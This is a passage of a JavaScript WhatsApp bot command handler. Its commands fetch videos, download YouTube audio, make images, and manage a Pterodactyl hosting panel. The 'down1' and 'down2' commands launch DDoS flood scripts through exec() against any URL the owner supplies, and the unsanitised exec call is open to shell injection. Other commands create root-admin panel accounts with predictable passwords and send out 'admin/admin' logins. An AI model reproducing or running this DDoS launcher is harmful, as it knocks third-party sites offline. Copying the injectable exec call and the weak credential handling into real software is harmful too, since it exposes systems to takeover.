    $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
        const href = $(element).attr('href');
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}
    if (text == '1') {
        try {
            let resl = await animeVideo()
            let cap = `Here's the video`
            await ptz.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2()
            let cap = `Here's the video`
            await ptz.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply('eror')
        }
    }
}
break   







case 'play5':
    if (!text) return reply(`Example: ${prefix + command} lagu terbang bersamaku

Example video : ${prefix + command} video gokil kocak`)

  
    await loading() 
    try {
        let search = await yts(`${text}`)
let caption = `*YOUTUBE PLAY*

ã‚ ID : ${search.all[0].videoId}
ã‚ Title : ${search.all[0].title}
ã‚ Views : ${search.all[0].views}
ã‚ Duration : ${search.all[0].timestamp}
ã‚ Channel : ${search.all[0].author.name}
ã‚ Upload : ${search.all[0].ago}
ã‚ URL Video : ${search.videos[0].url}
ã‚ Description : ${search.videos[0].description}

_Please wait, the audio file is being sent..._`
let todd = await getBuffer(search.all[0].image)
ptz.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
let ply = search.videos[0].url
const ytdl = require('youtubedl-core')
let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
ptz.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg' }, {quoted: m})
   })
    } catch(e) {
        console.log(e)
        reply('Ada Kesalahan')
    }
break 


case 'creategc':
case 'creategroup': {
if (!isCreator) return reply('`For My Owner Only`')
if (!args.join(" ")) return reply(`Use .creategc groupname`)
try {
let cret = await ptz.groupCreate(args.join(" "), [])
let response = await Fernazerini.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply(teks2)
} catch {
reply("Success")
}
}
break

case 'creatememe':
    const memeImageUrl = args[0];
    const topText = args[1];
    const bottomText = args[2];
    if (!memeImageUrl || !topText || !bottomText) return reply('Usage: .creatememe [image URL] [top text] [bottom text]');
    axios.get(`api.memegen.link/images/custom/${encodeURI(topText)}/${encodeURI(bottomText)}.jpg?background=${memeImageUrl}`, { responseType: 'arraybuffer' })
        .then(response => {
            const buffer = Buffer.from(response.data, 'binary');
            ptz.sendMessage(m.chat, { image: buffer, caption: 'Here is your meme!' });
        })
        .catch(() => reply('Could not create meme. Please check the image URL and try again.'));
    break;
 
        
        
        case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{



if (!text) return reply(`Example : ${prefix + command} QUEEN_ANITA-V3`);
    reply("`Error!, Server Is Down`")
    await ptz.sendMessage(m?.chat, {react: {text: `⚠`,key: m?.key,}}) 
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photoOxy(link, text);
ptz.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `Done`},
{ quoted: m }
);
}
break;
        
        
        
        
        
        
        
        
        
        // Attack Ddos Sesuai Skil Veemon
        case 'down2': {
if (!isCreator) return
if (!text) return reply(`*Example*: ${prefix + command} [url]`)

replym(`

*${m2}[ Serangan DDoS Di Proses ]${m2}*

-- ( ${text} ) --
•• TIME : 60
•• THREAD : 20
•• RATE : 100

*Terima kasih atas kesabaran Anda.* \n`, "telegra.ph/file/a1b59935b2561bf70af5a.jpg", "ATTACK");

exec(`node ./system/shutdown-link/Tachioro-Link-Z.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
        case 'down1': {
if (!isCreator) return
if (!text) return reply(`*Example*: ${prefix + command} [url]`)

replym(`

*${m2}[ Serangan DDoS Di Proses ]${m2}*

-- ( ${text} ) --
•• TIME : 60
•• THREAD : 20
•• RATE : 100

*Terima kasih atas kesabaran Anda.* \n`, "telegra.ph/file/a1b59935b2561bf70af5a.jpg", "ATTACK");

exec(`node ./system/shutdown-link/Tachioro-Link-A.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
        
        
        
        
        
        
        
        //  create panel  1gb - 8
       
    case 'panel': {
             let { generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
let t = text.split(',');
if (t.length < 2) return reply(`Example: ${prefix + command} user,nomer

Use: .panel deecee,2347043759577`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'List Disk dan Cpu Panel',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'Click For List', 
    sections
};

let msghhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: false, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1203632675319584@newsletter',
 newsletterName: 'zio', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `✦ Select Disk Size For Server `
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*${m2}[ Hallo Sir ${pushname} ]${m2}*`,
 subtitle: "Create",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" } }, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msghhhhhhh.key.remoteJid, msghhhhhhh.message, {
 messageId: msghhhhhhh.key.id
})}
break
        case 'reinstall': {
if (!isCreator) return reply("Tak nak")
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "detusr": {
if (!isCreator) return reply(`*Are You Ready? This Feature is Only for My Owner!*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return reply("Tak nak")
let t = text.split(',');
if (t.length < 4) return reply(`*input Format*

Usage:
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${tanggal2}
UPDATED AT: ${server.updated_at}`)
}
break
case "listsrv": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Here is a list of servers:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Name Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await ptz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use the command ${prefix}listsrv ${res.meta.pagination.current_page + 1} to see the next page`);
  }
}
break;
case "listusr": {
  if (!isCreator) return reply("Special people only")
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await ptz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use the command ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "delsrv": {
      if (!isCreator) return reply(`KHUSUS OWN`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break

case 'myip': {
 
  if (!isCreator) return m.reply(`For My Owner Only`);
  var http = require('http')
  http.get({
   'host': 'api.ipify.org',
   'port': 80,
   'path': '/'
  }, function(resp) {
       resp.on('data', function(ip) {
         m.reply("🔎 *Your Ip Address is :* " + ip);
       })
      })
}
break


 case 'ip':
if (!text) reply('give me IP address?')
let ipv = await (await fetch('https://endpoint.web.id/tools/cekip?key=gojou&id=' + text)).json();
if (ipv.status) {
 let shannz = ipv.result;
 let tesk = `*[ IP CHECKER ]*\n\nIP: ${shannz.ip}\nCity: ${shannz.city}\nCountry: ${shannz.country}\nLocation: ${shannz.loc}\nORG: ${shannz.org}\nPostal: ${shannz.postal}\nTime_Zone: ${shannz.timezone}\nMORE DETAIL: ${shannz.readme}`
reply(tesk)
} else {
reply('not found & error')
}
break

case "delusr": {
  if (!isCreator) return reply(`Owner only`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "addusr": {
if (!isCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nExample :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nExample :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*input Format!*

Usage:
${prefix + command} email,username,name,number/tag`);
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal2}
┗⬣ *PASSWORD Succeed SENT TO @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msghhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By © David-Cyril Dev', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `David Cyrilo æ`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`Please choose the size you want to buy`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msghhhhhhhh.key.remoteJid, msghhhhhhhh.message, {
 messageId: msghhhhhhhh.key.id
})
ptz.sendMessage(u, { text: `*HERE ARE YOUR PANEL ACCOUNT DETAILS*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "admin": {
if (!isCreator) return reply(`*Are You Ready? This Feature is Only for My Owner!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nExample :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nExample :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await ptz.sendMessage(m.chat, listMessage)

    await ptz.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE: OWNER ONLY SENDS YOUR ACCOUNT DATA 1X PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST OWNER CANNOT SEND YOUR ACCOUNT AGAIN*
• WARRANTY IS ONLY 1X
• WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE
• DO NOT DISTURB OTHER SERVERS
• CREATE SUFFICIENT PANELS


`,

    })

} 
break
case "listadmin": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await ptz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use the command ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*input Format!*

Usage:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isCreator) return reply(`WHAT DOES A DOG DO?`)
          if (!text) return reply(`Example : ${prefix + command} 23490xxxxx,price,linklog`)
            reply('Order Has Been Successfully Sent') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m22 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
ptz.sendMessage(mq1, {text:`*───❖》© David-Cyril 《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Your Order Received 📦*\n*Price : ${m22}*\n*Day : ${hariini}*\n*Date : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Don't Forget to Change Your Password to Avoid Panel Account Theft_*\n`}, m) 
                 }
            break             
case "webpanel":
if (!isCreator) return reply("I don't want to")
ewe = `Here Sir ${domain}`
await ptz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*Succeed SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*Succeed OPEN SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isCreator) return reply('kusus Owner')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
